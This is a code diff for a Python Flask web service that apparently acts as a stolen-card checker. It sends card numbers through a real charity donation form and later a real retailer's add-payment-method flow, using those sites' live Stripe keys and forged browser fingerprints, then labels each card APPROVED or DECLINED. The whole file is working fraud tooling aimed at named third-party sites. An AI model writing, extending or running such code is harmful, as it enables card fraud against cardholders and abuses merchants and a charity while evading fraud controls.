@@ -1,186 +1,180 @@
 import requests
-from bs4 import BeautifulSoup
+import re
+import uuid
+import time
 from fake_useragent import UserAgent
-import json
-from datetime import datetime
 from flask import Flask, request, jsonify
-
-class StripeProcessor:
-    def __init__(self):
-        self.ua = UserAgent()
-
-    def process_card_at(self, ccx, billing_info=None):
-        ccx = ccx.strip()
-        try:
-            n, mm, yy, cvc = ccx.split("|")
-        except ValueError:
-            return {"status": "Declined", "response": "Invalid card format", "gateway": "Authnet [5$]"}
-
-        if "20" in yy:
-            yy = yy.split("20")[1]
-
-        user_agent = self.ua.random
-
-        return self._process_needhelped(n, mm, yy, cvc, user_agent, billing_info)
-
-    def fetch_nonce_and_cookie(self, user_agent):
-        url = 'https://needhelped.com/campaigns/poor-children-donation-4/donate/'
-        headers = {'User-Agent': user_agent}
-
-        session = requests.Session()
-        response = session.get(url, headers=headers)
-        soup = BeautifulSoup(response.text, 'html.parser')
-
-        nonce_input = soup.find('input', {'name': '_charitable_donation_nonce'})
-        if not nonce_input:
-            return None, None
-
-        nonce = nonce_input.get('value')
-        cookies = session.cookies.get_dict()
-        return nonce, cookies
-
-    def _process_needhelped(self, n, mm, yy, cvc, user_agent, billing_info):
-        try:
-            # Default billing info if not provided
-            if not billing_info:
-                billing_info = {
-                    'name': 'John Doe',
-                    'email': 'user@example.com',
-                    'first_name': 'John',
-                    'last_name': 'Doe',
-                    'address': '123 Main St',
-                    'city': 'New York',
-                    'state': 'NY',
-                    'postcode': '10001',
-                    'country': 'US',
-                    'phone': '5551234567',
-                    'amount': '5.00'
-                }
-
-            # Create payment method
-            payment_data = {
-                'type': 'card',
-                'card[number]': n,
-                'card[cvc]': cvc,
-                'card[exp_year]': yy,
-                'card[exp_month]': mm,
-                'billing_details[name]': billing_info.get('name'),
-                'billing_details[email]': billing_info.get('email'),
-                'billing_details[address][city]': billing_info.get('city'),
-                'billing_details[address][country]': billing_info.get('country'),
-                'billing_details[address][line1]': billing_info.get('address'),
-                'billing_details[address][line2]': billing_info.get('address_2', ''),
-                'billing_details[address][postal_code]': billing_info.get('postcode'),
-                'billing_details[address][state]': billing_info.get('state'),
-                'billing_details[phone]': billing_info.get('phone'),
-                'payment_user_agent': 'stripe.js/2b425ea933; stripe-js-v3/2b425ea933',
-                'referrer': 'https://needhelped.com',
-                'key': 'pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr',
-            }
-
-            pm_response = requests.post(
-                'https://api.stripe.com/v1/payment_methods',
-                data=payment_data,
-                headers={'User-Agent': user_agent},
-                timeout=10
-            )
-            pm_json = pm_response.json()
-            
-            # Check for payment method errors
-            if 'error' in pm_json:
-                error = pm_json['error']
-                code = error.get('code', '')
-                message = error.get('message', '').lower()
-                
-                if 'incorrect_cvc' in code or 'security code incorrect' in message:
-                    return {"status": "Declined", "response": "error: CVV_INCORRECT", "gateway": "Authnet [5$]"}
-                elif 'invalid_cvc' in code or 'card must contain cvc' in message:
-                    return {"status": "Declined", "response": "error: CVV_MISSING", "gateway": "Authnet [5$]"}
-                elif 'expired' in message or 'invalid_expiry' in code:
-                    return {"status": "Declined", "response": "The provided card is expired", "gateway": "Authnet [5$]"}
-                elif 'test_mode' in message or 'live mode' in message:
-                    return {"status": "Declined", "response": "Invalid_Card_Data", "gateway": "Authnet [5$]"}
-                elif 'declined' in message:
-                    return {"status": "Declined", "response": "This transaction has been Declined", "gateway": "Authnet [5$]"}
-                else:
-                    return {"status": "Declined", "response": message, "gateway": "Authnet [5$]"}
-
-            payment_method_id = pm_json['id']
-
-            # Get donation nonce
-            nonce, cookies = self.fetch_nonce_and_cookie(user_agent)
-            if not nonce:
-                return {"status": "Declined", "response": "Failed to process payment", "gateway": "Authnet [5$]"}
-
-            # Process donation
-            donation_data = {
-                'charitable_form_id': '682b05da7e210',
-                '682b05da7e210': '',
-                '_charitable_donation_nonce': nonce,
-                '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
-                'campaign_id': '1164',
-                'description': 'Poor Children Donation Support',
-                'ID': '455173',
-                'donation_amount': 'custom',
-                'custom_donation_amount': billing_info.get('amount', '5.00'),
-                'first_name': billing_info.get('first_name'),
-                'last_name': billing_info.get('last_name'),
-                'email': billing_info.get('email'),
-                'address': billing_info.get('address'),
-                'address_2': billing_info.get('address_2', ''),
-                'city': billing_info.get('city'),
-                'state': billing_info.get('state'),
-                'postcode': billing_info.get('postcode'),
-                'country': billing_info.get('country'),
-                'phone': billing_info.get('phone'),
-                'gateway': 'stripe',
-                'stripe_payment_method': payment_method_id,
-                'action': 'make_donation',
-                'form_action': 'make_donation',
-            }
-
-            headers = {
-                'User-Agent': user_agent,
-                'Referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
-                'X-Requested-With': 'XMLHttpRequest',
-            }
-
-            donation_response = requests.post(
-                'https://needhelped.com/wp-admin/admin-ajax.php',
-                cookies=cookies,
-                headers=headers,
-                data=donation_data,
-                timeout=10
-            )
-            resp_json = donation_response.json()
-            
-            # Process response
-            if isinstance(resp_json, dict):
-                if 'requires_action' in resp_json and resp_json['requires_action']:
-                    return {"status": "Declined", "response": "A Duplicate transaction has been found", "gateway": "Authnet [5$]"}
-                elif 'success' in resp_json and resp_json['success']:
-                    return {"status": "Approved", "response": "Order Confirmed", "gateway": "Authnet [5$]"}
-                elif 'errors' in resp_json and 'Your card was declined' in str(resp_json['errors']):
-                    return {"status": "Declined", "response": "This transaction has been Declined", "gateway": "Authnet [5$]"}
-                else:
-                    return {"status": "Declined", "response": "Payment processing failed", "gateway": "Authnet [5$]"}
-            else:
-                return {"status": "Declined", "response": "Unexpected response from server", "gateway": "Authnet [5$]"}
-
-        except Exception as e:
-            return {"status": "Declined", "response": f"Processing Failed: {str(e)}", "gateway": "Authnet [5$]"}
-
-# Create global processor instance
-processor_at = StripeProcessor()
-
-def process_card_at(ccx):
-    return processor_at.process_card_at(ccx)
 
 app = Flask(__name__)
 
+def process_card(ccx):
+    ccx = ccx.strip()
+    try:
+        n, mm, yy, cvc = ccx.split("|")
+    except ValueError:
+        return {
+            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
+            "status": "DECLINED",
+            "gateway": "Stripe Square [0.20$]"
+        }
+    
+    if "20" in yy:
+        yy = yy.split("20")[1]
+    
+    user_agent = UserAgent().random
+    stripe_mid = str(uuid.uuid4())
+    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))
+
+    # Step 1: Create payment method with Stripe
+    # WARNING: Server-side card tokenization with publishable key is likely to fail due to Stripe's restrictions.
+    # Consider using client-side Stripe.js/Elements to create payment_method_id and pass it to this endpoint.
+    payment_data = {
+        'type': 'card',
+        'card[number]': n,
+        'card[cvc]': cvc,
+        'card[exp_year]': yy,
+        'card[exp_month]': mm,
+        'allow_redisplay': 'unspecified',
+        'billing_details[address][country]': 'IN',
+        'pasted_fields': 'number',
+        'payment_user_agent': 'stripe.js/ebc1f502d5; stripe-js-v3/ebc1f502d5; payment-element; deferred-intent',
+        'referrer': 'https://buildersdiscountwarehouse.com.au',
+        'time_on_page': str(int(time.time())),
+        'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
+        'client_attribution_metadata[merchant_integration_source]': 'elements',
+        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+        'client_attribution_metadata[merchant_integration_version]': '2021',
+        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+        'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
+        'guid': str(uuid.uuid4()) + str(int(time.time())),
+        'muid': stripe_mid,
+        'sid': stripe_sid,
+        'key': 'pk_live_51Q107x2KzKeWTXXpOywsGdTNQaEtZRRE9LKseUzC1oS3jOdQnP41co3ZYTIckSdqdv2DWOt8nnX469QiDEGacfzl00qHBbMx73',
+        '_stripe_version': '2024-06-20'
+    }
+
+    stripe_headers = {
+        'User-Agent': user_agent,
+        'accept': 'application/json',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site'
+    }
+
+    try:
+        pm_response = requests.post(
+            'https://api.stripe.com/v1/payment_methods',
+            data=payment_data,
+            headers=stripe_headers,
+            timeout=10
+        )
+        pm_data = pm_response.json()
+
+        if 'id' not in pm_data:
+            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
+            return {"response": error_msg, "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
+
+        payment_method_id = pm_data['id']
+    except Exception as e:
+        return {"response": f"Payment Method Creation Failed: {str(e)}", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
+
+    # Step 2: Get nonce from the website
+    cookies = {
+        '__stripe_mid': stripe_mid,
+        '__stripe_sid': stripe_sid,
+    }
+
+    headers = {
+        'User-Agent': user_agent,
+        'Referer': 'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+    }
+
+    try:
+        nonce_response = requests.get(
+            'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
+            headers=headers,
+            cookies=cookies,
+            timeout=10
+        )
+
+        if 'createAndConfirmSetupIntentNonce' in nonce_response.text:
+            nonce = nonce_response.text.split('createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
+        else:
+            return {"response": "Failed to extract nonce", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
+    except Exception as e:
+        return {"response": f"Nonce Retrieval Failed: {str(e)}", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
+
+    # Step 3: Create and confirm setup intent
+    params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
+    data = {
+        'action': 'create_and_confirm_setup_intent',
+        'wc-stripe-payment-method': payment_method_id,
+        'wc-stripe-payment-type': 'card',
+        '_ajax_nonce': nonce,
+    }
+
+    headers = {
+        'User-Agent': user_agent,
+        'Referer': 'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://buildersdiscountwarehouse.com.au',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    try:
+        setup_response = requests.post(
+            'https://buildersdiscountwarehouse.com.au/',
+            params=params,
+            headers=headers,
+            cookies=cookies,
+            data=data,
+            timeout=10
+        )
+        setup_data = setup_response.json()
+
+        if setup_data.get('success', False):
+            data_status = setup_data['data'].get('status')
+            if data_status == 'requires_action':
+                return {"response": "Thank You! for your donation", "status": "APPROVED", "gateway": "Stripe Square [0.20$]"}
+            elif data_status == 'succeeded':
+                return {"response": "Thank You! for your donation", "status": "APPROVED", "gateway": "Stripe Square [0.20$]"}
+            elif 'error' in setup_data['data']:
+                error_msg = setup_data['data']['error'].get('message', 'Unknown error')
+                return {"response": error_msg, "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
+
+        if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
+            error_msg = setup_data['data']['error'].get('message', 'Unknown error')
+            return {"response": error_msg, "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
+
+        return {"response": "Unknown response from gateway", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
+
+    except Exception as e:
+        return {"response": f"Setup Intent Failed: {str(e)}", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
+
+# Flask route to handle card processing
 @app.route('/gateway=authnet5$/cc=<ccx>', methods=['GET'])
 def handle_process_card(ccx):
-    result = process_card_at(ccx)
+    # Validate card format before processing
+    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', ccx):
+        return jsonify({
+            "response": "Invalid card format. Use CC|MM|YYYY|CVV",
+            "status": "DECLINED",
+            "gateway": "Stripe Square [0.20$]"
+        })
+    
+    result = process_card(ccx)
     return jsonify(result)
 
 if __name__ == '__main__':
